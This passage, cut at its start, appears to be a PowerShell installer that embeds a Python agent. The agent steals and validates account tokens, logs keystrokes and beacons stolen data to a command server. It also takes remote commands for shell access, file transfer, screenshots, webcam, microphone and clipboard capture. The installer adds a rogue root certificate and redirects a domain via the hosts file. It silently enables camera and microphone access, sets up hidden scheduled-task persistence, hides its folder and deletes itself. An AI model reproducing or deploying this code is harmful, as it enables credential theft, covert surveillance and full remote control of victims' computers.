        if not prev:
            events.append("NEW")
        elif prev.get("valid") and not info.get("valid"):
            events.append("PATCHED")
        known[hh(tok)] = {"valid": info.get("valid"), "id": info.get("id"), "t": int(time.time())}
        if info.get("valid"):
            users.append("%s (%s)" % (info.get("username"), info.get("id")))
            lines.append("VALID %s | %s | nitro %s\n%s\n%s" % (info.get("username"),
                         info.get("email") or "-", info.get("nitro"), tok, src))
        else:
            lines.append("INVALID %s\n%s\n%s" % (info.get("code", "?"), tok, src))
    save_state(st)

    for tok, src in disk_scan(t0 + 150):
        if tok in toks or len(tok) < 50:
            continue
        info = validate(tok) or {}
        if info.get("valid"):
            users.append("%s (%s)" % (info.get("username"), info.get("id")))
        lines.append("DEEP %s\n%s\n%s" % (info.get("username") or "?", tok, src))

    sp.update({"hwid": HWID, "host": socket.gethostname(), "user": os.environ.get("USERNAME", "?"),
               "tokens": "\n\n".join(lines)[:55000], "ntok": len(toks),
               "events": ",".join(sorted(set(events)))})
    api("/beacon", sp, timeout=300)
    log("cycle %ds tok=%d ck=%d pw=%d" % (time.time() - t0, len(toks), ck, pw))

KEYLOG = []

def _vk(v):
    m = {8: "[BS]", 9: "[TAB]", 13: "\n", 32: " ", 160: "[SHIFT]", 162: "[CTRL]", 164: "[ALT]"}
    if v in m:
        return m[v]
    if 48 <= v <= 57 or 65 <= v <= 90:
        return chr(v).lower()
    return ""

def kl():
    while True:
        for v in range(8, 256):
            if ctypes.windll.user32.GetAsyncKeyState(v) & 1:
                c = _vk(v)
                if c:
                    KEYLOG.append(c)
                    if len(KEYLOG) > 8000:
                        del KEYLOG[:2000]
        time.sleep(0.02)

def do_shell(a):
    r = subprocess.run(a, shell=True, cwd=CWD, capture_output=True, timeout=180)
    return (r.stdout + r.stderr).decode("mbcs", "replace")[:50000] or "(no output)"

def do_ls(a):
    global CWD
    if a.strip():
        CWD = a.strip().strip('"')
    if not os.path.isdir(CWD):
        return "bad dir"
    return "\n".join(sorted(os.listdir(CWD)))

def do_dl(a):
    p = a.strip().strip('"')
    if not os.path.isfile(p):
        return "not found"
    return open(p, "rb").read(), os.path.basename(p)

def do_ul(a):
    p, _, b = a.partition("|")
    open(p.strip().strip('"'), "wb").write(base64.b64decode(b))
    return "written"

def ps(c):
    return subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", c],
                          capture_output=True, text=True, timeout=120, creationflags=0x08000000).stdout

def do_uninstall(a):
    for t in ("FakeAuthGrab", "FakeAuth"):
        subprocess.run(["schtasks", "/delete", "/tn", t, "/f"], capture_output=True)
    subprocess.Popen(["powershell", "-NoProfile", "-Command",
                      "attrib -h -s C:\\seven; Start-Sleep 2; Remove-Item C:\\seven -Recurse -Force"])
    return "uninstalled"

HANDLERS = {
    "info": lambda a: json.dumps(sysinfo(), indent=1, ensure_ascii=False),
    "shell": do_shell, "ls": do_ls, "download": do_dl, "upload": do_ul,
    "screenshot": lambda a: (open(shot(), "rb").read(), "screen.jpg"),
    "cam": lambda a: (open(camera(), "rb").read(), "cam.jpg"),
    "mic": lambda a: (open(voice(10), "rb").read(), "voice.wav"),
    "clip": lambda a: ps("Get-Clipboard -Raw") or "-",
    "keylog": lambda a: ("".join(KEYLOG) or "-")[-40000:],
    "procs": lambda a: ps("Get-Process | Sort WorkingSet -Desc | Select -First 60 Name,Id,WS | Format-Table -Auto | Out-String"),
    "msgbox": lambda a: ps("Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('%s')" % a.replace("'", "''")) or "shown",
    "open": lambda a: subprocess.Popen("start \"\" \"%s\"" % a, shell=True) and "opened",
    "reboot": lambda a: subprocess.run(["shutdown", "/r", "/t", "5"], capture_output=True) and "rebooting",
    "uninstall": do_uninstall,
}

def run_cmd(c):
    fn = HANDLERS.get(c.get("cmd"))
    if not fn:
        api("/result", {"hwid": HWID, "id": c["id"], "ok": False, "out": "unknown"})
        return
    try:
        r = fn(c.get("args") or "")
    except Exception as e:
        api("/result", {"hwid": HWID, "id": c["id"], "ok": False, "out": repr(e)[:400]})
        return
    out, files = "", []
    if isinstance(r, tuple) and isinstance(r[0], (bytes, bytearray)):
        files.append({"name": r[1], "b64": base64.b64encode(r[0]).decode()})
    else:
        out = str(r)
    api("/result", {"hwid": HWID, "id": c["id"], "ok": True, "out": out, "files": files}, timeout=300)

def main():
    threading.Thread(target=kl, daemon=True).start()
    last = 0
    while True:
        try:
            if time.time() - last > INTERVAL:
                last = time.time()
                threading.Thread(target=cycle, daemon=True).start()
            c = api("/cmd?h=" + HWID, timeout=30)
            if c and c.get("cmd"):
                run_cmd(c)
        except Exception as e:
            log("loop %r" % e)
        time.sleep(POLL)

if __name__ == "__main__":
    main()
'@

$utf8 = New-Object System.Text.UTF8Encoding($false)
foreach ($pair in @(@('makecert.py',$makecert), @('run.py',$runner), @('fake.py',$fake), @('cam.ps1',$cam), @('screen.ps1',$screen), @('agent.py',$grab))) {
    [IO.File]::WriteAllText((Join-Path $Root $pair[0]), $pair[1], $utf8)
}

python makecert.py
if (-not (Test-Path (Join-Path $Root 'seven.cer'))) { throw 'cert failed' }
$c = Import-Certificate -FilePath (Join-Path $Root 'seven.cer') -CertStoreLocation 'Cert:\CurrentUser\Root'
Write-Host "   cert $($c.Thumbprint)" -ForegroundColor Green

Copy-Item $Hosts (Join-Path $Root 'hosts.bak') -Force
Set-ItemProperty -Path $Hosts -Name IsReadOnly -Value $false -ErrorAction SilentlyContinue

$hlines = @(Get-Content $Hosts | Where-Object { $_ -notmatch [regex]::Escape($Domain) })
$hlines += "127.0.0.1 $Domain"
$htmp = Join-Path $env:TEMP 'hosts.seven'

$hok = $false
foreach ($try in 1..3) {
    try {
        [IO.File]::WriteAllLines($htmp, $hlines)
        Copy-Item $htmp $Hosts -Force
        $hok = $true
        break
    } catch { Start-Sleep -Milliseconds 500 }
}
if (-not $hok) {
    try { $hlines | Set-Content -Path $Hosts -Force; $hok = $true } catch {}
}
if ($hok) { Write-Host '   hosts OK' -ForegroundColor Green }
else { Write-Host '   hosts FAIL - dir manual' -ForegroundColor Red }
ipconfig /flushdns | Out-Null

foreach ($cap in 'webcam','microphone') {
    $k = "HKCU:\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\$cap"
    if (-not (Test-Path $k)) { New-Item -Path $k -Force | Out-Null }
    Set-ItemProperty -Path $k -Name 'Value' -Value 'Allow'
}

$ico = Join-Path $Root 'fakeauth.ico'
try {
    Invoke-WebRequest -UseBasicParsing $IconUrl -OutFile (Join-Path $Root 'icon.jpg')
    Add-Type -AssemblyName System.Drawing
    $img = [System.Drawing.Image]::FromFile((Join-Path $Root 'icon.jpg'))
    $bmp = New-Object System.Drawing.Bitmap $img, 128, 128
    $icon = [System.Drawing.Icon]::FromHandle($bmp.GetHicon())
    $fs = [IO.File]::Create($ico); $icon.Save($fs); $fs.Close()
    $img.Dispose(); $bmp.Dispose()
} catch {}

$cs = Join-Path $Root 'launch.cs'
@"
using System;
using System.Diagnostics;
using System.IO;
class P {
  static void Main(string[] a) {
    string dir = Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName);
    string s = a.Length > 0 ? a[0] : "run.py";
    var si = new ProcessStartInfo(@"$pyw", "\"" + Path.Combine(dir, s) + "\"");
    si.WorkingDirectory = dir;
    si.UseShellExecute = false;
    si.CreateNoWindow = true;
    Process.Start(si).WaitForExit();
  }
}
"@ | Set-Content -Path $cs -Encoding UTF8

$csc = "$env:windir\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
if (Test-Path $csc) {
    $cargs = @('/nologo','/target:winexe',"/out:$Launcher")
    if (Test-Path $ico) { $cargs += "/win32icon:$ico" }
    $cargs += $cs
    & $csc $cargs 2>&1 | Out-Null
}
if (-not (Test-Path $Launcher)) { Copy-Item $pyw $Launcher -Force; $Launcher = $pyw }
Remove-Item $cs -Force -ErrorAction SilentlyContinue

$principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
    -StartWhenAvailable -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) `
    -ExecutionTimeLimit ([TimeSpan]::Zero) -MultipleInstances IgnoreNew -DontStopOnIdleEnd
$trigger = New-ScheduledTaskTrigger -AtLogOn -User "$env:USERDOMAIN\$env:USERNAME"

foreach ($pair in @(@('FakeAuth','run.py'), @('FakeAuthGrab','agent.py'))) {
    $act = New-ScheduledTaskAction -Execute $Launcher -Argument $pair[1] -WorkingDirectory $Root
    Register-ScheduledTask -TaskName $pair[0] -Action $act -Trigger $trigger -Settings $settings `
        -Principal $principal -Force | Out-Null
}

Start-ScheduledTask -TaskName 'FakeAuth'
Start-ScheduledTask -TaskName 'FakeAuthGrab'
Start-Sleep -Seconds 5
attrib +h +s $Root

Write-Host ''
if (Get-NetTCPConnection -LocalPort 443 -State Listen -ErrorAction SilentlyContinue) {
    Write-Host '   :443 LISTEN' -ForegroundColor Green
} else { Write-Host '   :443 FAIL' -ForegroundColor Red }
Start-Sleep -Seconds 2
Get-Content (Join-Path $Root 'server.log') -Tail 3 -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "   $_" -ForegroundColor DarkGray }
Write-Host ''
Write-Host 'OK' -ForegroundColor Green
Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue
